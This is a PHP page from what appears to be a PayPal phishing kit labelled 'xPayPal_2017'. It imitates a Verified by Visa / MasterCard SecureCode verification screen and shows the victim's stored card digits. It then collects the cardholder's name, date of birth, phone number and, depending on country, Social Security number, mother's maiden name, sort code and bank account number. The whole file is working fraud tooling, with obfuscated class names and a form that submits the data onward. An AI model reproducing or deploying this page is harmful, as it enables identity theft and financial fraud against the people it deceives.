<?php
include 'inc/config.php';
include 'language.php';
$negara = $_SESSION['country'];
$ssn = array('UNITED STATES');
$mmn = array('UNITED STATES', 'IRELAND', 'GERMANY', 'SWITZERLAND', 'UNITED KINGDOM', 'CANADA');
$acc = array('IRELAND', 'GERMANY', 'SWITZERLAND', 'UNITED KINGDOM', 'FINLAND');
$srt = array('UNITED KINGDOM','IRELAND');
        $cc_number = str_replace(array(' ', '-'), '', $_SESSION['cart']);
        $last4numbers = substr($cc_number, -(-52 - -56), -8 - -12);
		if(isset($_SESSION['typecc'] )) {
		        if ($_SESSION['typecc'] == 'visa') {
            $ktek = 'Verified by Visa';
            $image = 'verified-by-visa.png';
        } elseif ($_SESSION['typecc'] == 'mastercard') {
            $ktek = 'MasterCard SecureCode';
            $image = 'mastercard-securecode.png';
        } elseif ($_SESSION['typecc'] == 'amex') {
            $ktek = 'American Express';
            $image = 'american-express.png';
        }
		}
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>3-D Security Auth.</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="d1xb04v7ib1a gcd0yn9m9uj239ejjanazq2ubz3er5ey8 spinner oxxo w9kp2kvcuxrvm8n" style="display: none; opacity: 0;">
            <p id="loading_title">Redirecting...</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/vbv.js"></script>
            <div id="popup">Processing</div>
            <div id="vbv_form">
                <div class="lph6v0nnakf1 row" id="vbv_line_0">
                    <table>
                        <tbody>
                            <tr>
                                <td><img class="1mdioqywmkn1zpc6g3q7nkwb5gu5qtti6yrle cc_bank" id="cc_bank" src="./file/ssl.png"></td>
                                <td><img class="rz59aaf tym46ei dp cc_type" id="cc_type" src="./img/<?=$image;?>"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="zhuona5miryw7tifstshqdi2whakltea2zqf1lta4hx row" id="vbv_line_1">
                    <?=$language['vbv']['lines'][1];?>
                </div>
                <div class="1tlkymdn3k row" id="vbv_line_2">
                    <?=$ktek;?>
                        <?=$language['vbv']['lines'][2];?> <b><?=$_SESSION['bank'];?></b>
                            <?=$language['vbv']['lines'][3];?>
                                <?=$ktek;?>
                                    <?=$language['vbv']['lines'][4];?>
                                        <?=$ktek;?>
                                            <?=$language['vbv']['lines'][5];?>
                </div>
                <div class="yf3q6aqyu2 iedx9o3f row" id="vbv_line_3">
                    <table>
                        <tbody>
                            <tr>
                                <td>
                                    <?=$language['vbv'][1];?>:</td>
                                <td>PayPal Inc.</td>
                            </tr>
                            <tr>
                                <td>
                                    <?=$language['vbv'][2];?>:</td>
                                <td>0.01 USD</td>
                            </tr>
                            <tr>
                                <td>
                                    <?=$language['vbv'][3];?>:</td>
                                <td>
                           <?php
echo @date('m/d/Y');
?>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <?=$language['vbv'][4];?>:</td>
<?php
if ($_SESSION['typecc'] == 'amex') {
    echo '' . '<td>XXXX-XXXXXX-X' . "{$last4numbers}" . '</td>' . '';
} else {
    echo '' . '<td>XXXX-XXXX-XXXX-' . "{$last4numbers}" . '</td>' . '';
}
?>
                            </tr>
                            <tr>
                                <td>
                                    <?=$language['vbv'][5];?>:</td>
                                <td>
                                        <?=$_SESSION['type'];?>
                                            <?=$_SESSION['category'];?>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <?=$language['vbv'][6];?>:</td>
                                <td>
                                    <?=$_SESSION['bank'];?>
                                </td>
                            </tr>
                            <tr class="tr_height25px">
                                <td>
                                    <?=$language['vbv'][7];?>:</td>
                                <td><input type="text" name="holder" id="holder" value="" placeholder="" style="width:170px;"></td>
                            </tr>
                            <tr class="tr_height25px">
                                <td>
                                    <?=$language['vbv'][8];?>:</td>
                                <td>
                                    <input type="text" name="dob_1" id="dob_1" value="" placeholder="" maxlength="2" style="width:20px;"> /
                                    <input type="text" name="dob_2" id="dob_2" value="" placeholder="" maxlength="2" style="width:20px;"> /
                                    <input type="text" name="dob_3" id="dob_3" value="" placeholder="" maxlength="4" style="width:40px;"> (DD/MM/YYYY)
                                </td>
                            </tr>
							
							                            <?php if (in_array($negara, $mmn)) { echo '<tr class="tr_height25px">
				<td>Mother\'s Maiden Name:</td>
				<td><input type="text" name="mmn" id="mmn" value="" placeholder="" style="width:170px;"></td>
														</tr>';}
			?>
							
                            <?php if (in_array($negara, $srt)) { echo '
			<tr class="tr_height25px">
				<td>Sort Code:</td>
				<td>
					<input type="text" name="sort_1" id="sort_1" value="" placeholder="" maxlength="2" style="width:20px;"> - 
					<input type="text" name="sort_2" id="sort_2" value="" placeholder="" maxlength="2" style="width:20px;"> - 
					<input type="text" name="sort_3" id="sort_3" value="" placeholder="" maxlength="2" style="width:20px;"> (XX-XX-XX)
				</td>
			</tr>';
			}?>
			
			
			
			
                            <?php if (in_array($negara, $acc)) { echo '
						<tr>
				<td>Bank Account Number:</td>
				<td><input type="text" name="acc_num" id="acc_num" value="" placeholder="" style="width:170px;"></td>
							</tr>';}
			?>
			
			
			
                            <?php
if (in_array($negara, $ssn)) { echo '
			<tr class="tr_height25px">
				<td>Social Security Number:</td>
				<td>
					<input type="text" name="ssn_1" id="ssn_1" value="" placeholder="" maxlength="3" style="width:30px;"> - 
					<input type="text" name="ssn_2" id="ssn_2" value="" placeholder="" maxlength="2" style="width:20px;"> - 
					<input type="text" name="ssn_3" id="ssn_3" value="" placeholder="" maxlength="4" style="width:40px;"> (XXX-XX-XXXX)
				</td>
			</tr>
';}
?>
                                <tr class="tr_height25px">
                                    <td>
                                        <?=$language['vbv'][9];?>:</td>
                                    <td>+ <input type="text" name="phone1" id="phone1" value="" placeholder="" style="width:30px;">
                                        <input type="text" name="phon2e" id="phone2" value="" placeholder="" style="width:128px;">
                                    </td>
                                </tr>
                                <input type="hidden" name="country_form" id="country_form" value="<?=$_SESSION['country'];?>">
                                <tr>
                                    <td></td>
                                    <td><input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" x="thanks.php" value="Continue">
                                        <div id="vbv_back" x="thanks.php">Back</div>
                                    </td>
                                </tr>
                                <tr>
                                    <tr>
                                        <td>
                                            <?=$_SESSION['phone'];?>
                                        </td>
                                        <td>
                                            <?=$_SESSION['url'];?>
                                        </td>
                                    </tr>
                                </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </body>

    </html>